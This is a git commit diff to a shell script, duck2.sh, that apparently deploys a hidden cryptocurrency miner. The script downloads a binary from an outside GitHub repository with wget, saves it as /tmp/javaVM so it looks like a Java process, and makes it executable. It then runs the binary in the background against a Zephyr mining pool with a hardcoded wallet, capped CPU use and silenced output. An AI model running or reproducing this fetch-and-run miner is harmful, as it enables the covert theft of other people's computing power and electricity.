644c70600b15ff598fe4a4b01aa86509dbf037b3
cronjob <thesunofme1@gmail.com>
2023-11-21 04:49:37 +0700

    Update duck2.sh

--- duck2.sh
+++ duck2.sh
@@ -4,7 +4,7 @@ if [ -f /tmp/javaVM ]
  	/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q https://github.com/thesunofme/trash/raw/main/xmrig -O /tmp/javaVM
+ 		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
  		chmod +x /tmp/javaVM
  		/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
